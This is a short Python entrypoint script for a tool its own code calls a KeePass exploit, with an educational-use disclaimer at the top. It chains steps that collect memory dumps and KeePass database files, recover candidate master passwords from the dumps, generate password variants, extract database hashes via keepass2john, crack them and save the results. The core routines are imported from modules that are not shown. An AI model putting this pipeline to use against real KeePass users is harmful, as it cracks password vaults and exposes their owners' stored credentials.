"""
This script is intended solely for educational purposes as an exercise in imitation.
Any practical use of this script outside of educational or supervised demonstration scenarios is strictly prohibited.

Author: Mihai-Andrei Neacsu
"""

import traceback
from init import init
from logger import log_msg
from utils import (
    collect_dumps,
    collect_keepass_hashes,
    collect_possible_pwds,
    exploit_keepass_hashes,
    generate_pwds,
    get_or_create_folders,
    generate_pod_file,
)


def keepass_exploit_entrypoint():
    args = init()
    (
        keepass_password_dumper_dir,
        keepass2john_dir,
        possible_pwds_dir,
        keepass_hashes_dir,
        generated_pwds_dir,
        output_dir,
    ) = get_or_create_folders()
    dump_files, keepass_files = collect_dumps(args.dir)
    possible_pwds_files = collect_possible_pwds(dump_files, keepass_password_dumper_dir, possible_pwds_dir)
    generated_pwds_files = generate_pwds(possible_pwds_files, generated_pwds_dir)
    keepass_hash_files = collect_keepass_hashes(keepass_files, keepass_hashes_dir, keepass2john_dir)

    results = exploit_keepass_hashes(generated_pwds_files, keepass_hash_files)
    pod_file = generate_pod_file(results, output_dir)
    log_msg(f"{pod_file}")


if __name__ == "__main__":
    try:
        keepass_exploit_entrypoint()
    except Exception:
        log_msg(traceback.format_exc(), "ERROR")
